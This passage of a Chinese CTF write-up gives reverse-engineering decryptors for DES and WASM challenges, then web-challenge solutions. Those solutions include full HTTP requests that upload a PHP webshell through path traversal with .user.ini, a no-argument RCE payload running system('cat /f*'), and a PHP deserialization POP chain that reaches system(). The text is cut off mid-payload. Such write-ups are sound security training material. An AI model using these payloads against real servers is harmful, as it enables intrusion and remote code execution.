        0x00000020, 0x000000C0, 0x00000087, 0x00000055, 0x000000D6, 0x0000003B, 0x00000046, 0x0000003D,
        0x000000F7, 0x000000B2, 0x0000007A, 0x0000009D, 0x000000C2, 0x000000CF, 0x0000001A, 0x000000AE,
        0x00000016, 0x000000C7, 0x00000015, 0x00000030, 0x0000008E, 0x000000FD, 0x0000008F, 0x0000009E,
        0x000000AA, 0x00000039, 0x000000AB, 0x000000FE, 0x00000095, 0x000000A7, 0x0000001F, 0x000000F1&#125;;

    unsigned char Enc[64]&#123;&#125;;
    for (int i &#x3D; 0; i &lt; 64; i++)
        Enc[i] &#x3D; data[i];

    &#x2F;&#x2F; 四字节一组翻转
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 4)
    &#123;
        auto a &#x3D; Enc[i], b &#x3D; Enc[i + 1], c &#x3D; Enc[i + 2], d &#x3D; Enc[i + 3];
        Enc[i] &#x3D; d;
        Enc[i + 1] &#x3D; c;
        Enc[i + 2] &#x3D; b;
        Enc[i + 3] &#x3D; a;
    &#125;
    
    &#x2F;&#x2F; DES解密（用后32个key）
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 8)
        des_encrypt((unsigned int *)(Enc + i), (DWORD *)(key + 32));

    &#x2F;&#x2F; 四字节一组翻转
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 4)
    &#123;
        auto a &#x3D; Enc[i], b &#x3D; Enc[i + 1], c &#x3D; Enc[i + 2], d &#x3D; Enc[i + 3];
        Enc[i] &#x3D; d;
        Enc[i + 1] &#x3D; c;
        Enc[i + 2] &#x3D; b;
        Enc[i + 3] &#x3D; a;
    &#125;

    printf(&quot;HZNUCTF&#123;&quot;);
    &#x2F;&#x2F; 逆向初始字符串变换
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 4)
    &#123;
        std::string tmp1;
        tmp1 +&#x3D; Enc[i];
        tmp1 +&#x3D; Enc[i + 2];

        std::string tmp2;
        tmp2 +&#x3D; Enc[i + 1];
        tmp2 +&#x3D; Enc[i + 3];

        printf(&quot;%c&quot;, char(std::stoi(tmp1, 0, 16)));
        printf(&quot;%c&quot;, char(std::stoi(tmp2, 0, 16)));
    &#125;

    printf(&quot;&#125;\n&quot;);

    return 0;
&#125;</code></pre>

<p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。</p>
<p>左题目附件，右正常wasm文件。</p>
<p><img src="/images/1744633170178-32.png" alt="img" loading="lazy"></p>
<p>使用ghidra进行分析，因为有专门的wasm反编译插件。</p>
<p>通过Exports定位到main函数，以下是经过我重命名后的结果。</p>
<p><img src="/images/1744633170178-33.png" alt="img" loading="lazy"></p>
<p>首先是输入key，然后判断和该处明文是否相等。</p>
<p>然后将Key xor上0x51。</p>
<p><img src="/images/1744633170178-34.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170178-35.png" alt="img" loading="lazy"></p>
<p>第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。</p>
<p><img src="/images/1744633170178-36.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-37.png" alt="img" loading="lazy"></p>
<p>第二步加密（四个字节一组加密）：</p>
<ol>
<li>用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。</li>
<li>调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。</li>
<li>再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**”TGCTF404”**。</li>
</ol>
<p><img src="/images/1744633170179-38.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-39.png" alt="img" loading="lazy"></p>
<p>最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。</p>
<p><img src="/images/1744633170179-40.png" alt="img" loading="lazy"></p>
<p>导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。</p>
<p>解密代码：</p>
<pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

&#x2F;&#x2F; 0x10da0处数据
unsigned char box[] &#x3D; &#123;
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;
    
&#x2F;&#x2F; 0x10ea0处数据
unsigned char box_ori[] &#x3D; &#123;
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48&#125;;
    
void unnamed_function_10(byte *param1, int param2)
&#123;
    for (int i &#x3D; 0; i &lt; 0x100; i &#x3D; i + 1)
    &#123;
        param1[i] &#x3D; param1[i] ^ (byte)param2;
    &#125;
    return;
&#125;

unsigned char Enc[] &#x3D; &#123;
    0x84, 0x00, 0x00, 0x00,
    0x1c, 0x00, 0x00, 0x00,
    0x6b, 0x00, 0x00, 0x00,
    0xf7, 0x00, 0x00, 0x00,
    0x49, 0x00, 0x00, 0x00,
    0x22, 0x00, 0x00, 0x00,
    0xd6, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0x50, 0x00, 0x00, 0x00,
    0x7b, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0xf4, 0x00, 0x00, 0x00,
    0x46, 0x00, 0x00, 0x00,
    0xa9, 0x00, 0x00, 0x00,
    0x83, 0x00, 0x00, 0x00,
    0x62, 0x00, 0x00, 0x00,
    0xd1, 0x00, 0x00, 0x00,
    0x32, 0x00, 0x00, 0x00,
    0x80, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00,
    0xa3, 0x00, 0x00, 0x00,
    0xf2, 0x00, 0x00, 0x00,
    0xe2, 0x00, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00,
    0x0b, 0x00, 0x00, 0x00,
    0x76, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x00,
    0xdc, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x00, 0x00,
    0x51, 0x00, 0x00, 0x00&#125;;

void Dec_2(unsigned char *Input, unsigned char *Key)
&#123;
    static int c &#x3D; 0;
    int iVar1 &#x3D; (int)Key[c] &gt;&gt; 4;
    DWORD uVar2 &#x3D; (int)Key[c] &amp; 0xf;
    c++;
    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));
    unsigned char key_o[] &#x3D; &quot;TGCTF404&quot;;
    for (int i &#x3D; 0; i &lt; 4; i++)
    &#123;
        Input[i] &#x3D; Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];
        Input[i] &#x3D; Input[i] ^ key_o[i];
    &#125;
&#125;

void decrypt(unsigned char *Input, int length)
&#123;
    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;

    for (int i &#x3D; 0; i &lt; 8; i++)
        Key[i] ^&#x3D; 0x51;

    for (int i &#x3D; 0; i &lt; length; i +&#x3D; 4)
    &#123;
        Dec_2((unsigned char *)(Input + i), Key);
    &#125;

    srand(0x194);

    int swaps[32][2];
    for (int i &#x3D; 0; i &lt; 32; i++)
    &#123;
        auto Value &#x3D; rand();
        Value &#x3D; i + Value &#x2F; (0x7fff &#x2F; (32 - i) + 1);
        swaps[i][0] &#x3D; i;
        swaps[i][1] &#x3D; Value;
    &#125;

    for (int i &#x3D; 31; i &gt;&#x3D; 0; i--)
    &#123;
        unsigned char temp &#x3D; Input[swaps[i][0]];
        Input[swaps[i][0]] &#x3D; Input[swaps[i][1]];
        Input[swaps[i][1]] &#x3D; temp;
    &#125;
&#125;

int main()
&#123;
    unsigned char Key[] &#x3D; &quot;TGCTF404&quot;;
    unsigned char Enc_flag[32]&#123;&#125;;
    
    for (int i &#x3D; 0; i &lt; 32; i++)
        Enc_flag[i] &#x3D; *(int *)((byte *)Enc + i * 4);

    decrypt(Enc_flag, 32);

    printf(&quot;%.32s\n&quot;, Enc_flag);
    return 0;
&#125;</code></pre>

<p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a>(ez)upload</h3><p>扫目录 有 upload.php.bak 翻源码。name处存在穿越。</p>
<p>可以上传.user.ini。而只有上级目录有php文件可以触发。</p>
<p>因此。我们传图片马和.user.ini到上级目录。等待触发即可。</p>
<p>payload：</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;upload.php?name&#x3D;..&#x2F;evil.png HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32690
Content-Length: 320
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary76S3hC5Gh3B7j6KZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;name&quot;; filename&#x3D;&quot;1.png&quot;
Content-Type: application&#x2F;octet-stream

&lt;?php phpinfo();?&gt;


------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;submit&quot;

上传文件
------WebKitFormBoundary76S3hC5Gh3B7j6KZ--
POST &#x2F;upload.php?name&#x3D;..&#x2F;.user.ini HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32690
Content-Length: 335
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary76S3hC5Gh3B7j6KZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32690&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;name&quot;; filename&#x3D;&quot;.user.ini&quot;
Content-Type: application&#x2F;octet-stream

auto_prepend_file&#x3D;evil.png

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name&#x3D;&quot;submit&quot;

上传文件
------WebKitFormBoundary76S3hC5Gh3B7j6KZ--</code></pre>

<p>在phpinfo的$_SERVER[‘FLAG’]里看到flag</p>
<h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a>AAA偷渡阴平</h3><p>无参数RCE绕过。</p>
<p>payload：</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(&#39;cat &#x2F;f*&#39;); HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:30815
Accept-Language: zh-CN,zh;q&#x3D;0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
CUIASDGHFIOUWE: 123123
Accept-Encoding: gzip, deflate, br
Connection: keep-alive</code></pre>

<h3 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h3><p>robots.txt 进去有 class.php 一眼就能瞪出来pop链子。</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
highlight_file(__FILE__);
error_reporting(0);

class yesterday &#123;
    public $learn;
    public $study&#x3D;&quot;study&quot;;
    public $try;
    public function __construct()
    &#123;
        $this-&gt;learn &#x3D; &quot;learn&lt;br&gt;&quot;;
    &#125;
    public function __destruct()
    &#123;
        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;
        return $this-&gt;study-&gt;hard();
    &#125;
&#125;
class today &#123;
    public $doing;
    public $did;
    public $done;
    public function __construct()&#123;
        $this-&gt;did &#x3D; &quot;What you did makes you outstanding.&lt;br&gt;&quot;;
    &#125;
    public function __call($arg1, $arg2)
    &#123;
        $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;
        echo $this-&gt;done;
        if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666)&#123;
            return $this-&gt;doing();
        &#125;
        else&#123;
            return $this-&gt;doing-&gt;better;
        &#125;
    &#125;
&#125;
class tommoraw &#123;
    public $good;
    public $bad;
    public $soso;
    public function __invoke()&#123;
        $this-&gt;good&#x3D;&quot;You&#39;ll be good tommoraw!&lt;br&gt;&quot;;
        echo $this-&gt;good;
    &#125;
    public function __get($arg1)&#123;
        $this-&gt;bad&#x3D;&quot;You&#39;ll be bad tommoraw!&lt;br&gt;&quot;;
    &#125;

&#125;
class future&#123;
    private $impossible&#x3D;&quot;How can you get here?&lt;br&gt;&quot;;
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) &#123;
        if ($this-&gt;out-&gt;useful7) &#123;
            echo &quot;Seven is my lucky number&lt;br&gt;&quot;;
            system(&#39;whoami&#39;);
        &#125;
    &#125;
    public function __toString()&#123;
        echo &quot;This is your future.&lt;br&gt;&quot;;
        system($_POST[&quot;wow&quot;]);
        return &quot;win&quot;;
    &#125;
    public function __destruct()&#123;
        $this-&gt;no &#x3D; &quot;no&quot;;
        return $this-&gt;no;
    &#125;
&#125;
$evil &#x3D; new yesterday();
$evil -&gt; study &#x3D; new today();
$evil -&gt; study -&gt; doing &#x3D; new future();</code></pre>

<p>随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。</p>
<pre class="language-HTTP" data-language="HTTP"><code class="language-HTTP">POST &#x2F;upload.php HTTP&#x2F;1.1
Host: node1.tgctf.woooo.tech:32439
Content-Length: 5437
Cache-Control: max-age&#x3D;0
Accept-Language: zh-CN,zh;q&#x3D;0.9
Origin: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32439
Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryurqPJUpE3whNwI5B
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;134.0.0.0 Safari&#x2F;537.36
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
Referer: http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32439&#x2F;
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryurqPJUpE3whNwI5B
Content-Disposition: form-data; name&#x3D;&quot;Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0&#x3D;.txt&quot;; filename&#x3D;&quot;Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1Z